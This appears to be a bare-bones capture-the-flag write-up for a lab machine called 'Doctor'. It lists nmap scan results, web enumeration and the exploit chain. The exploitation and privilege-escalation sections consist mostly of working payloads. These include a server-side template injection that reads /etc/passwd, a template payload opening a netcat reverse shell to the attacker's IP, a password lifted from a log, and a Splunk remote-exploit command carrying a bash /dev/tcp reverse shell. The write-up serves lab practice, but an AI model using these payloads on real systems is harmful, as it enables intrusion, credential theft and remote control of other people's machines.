# Doctor

### Nmap

```
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
|_http-server-header: Splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enum

```
https://10.10.10.209:8089/

https://10.10.10.209:8089/static/atom.xsl

http://doctors.htb/login?next=%2F

admin@doctors.htb
```

### Exploitation

```bash
# Post title will be shown on archive
# SSTI test
{{7*7}} ${7*7} <%= 7*7 %> ${{7*7}} #{7*7}
49      ${7*7} <%= 7*7 %> $49      #{7*7}

# read /etc/pass
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# get shell
{{''.__class__.__mro__[1].__subclasses__()[407] ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 443 >/tmp/f',shell=True,stdout=-1).communicate()}}
```

### Priv Esc

```bash
# found possible password
./apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"

# switch to shaun
su shaun:Guitar123

# get root shell
# Ref: https://github.com/cnotin/SplunkWhisperer2.git
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.29 --lport 12345 --username shaun --password Guitar123 --payload 'bash -c "bash -i >& /dev/tcp/10.10.14.29/443 0>&1"'
```
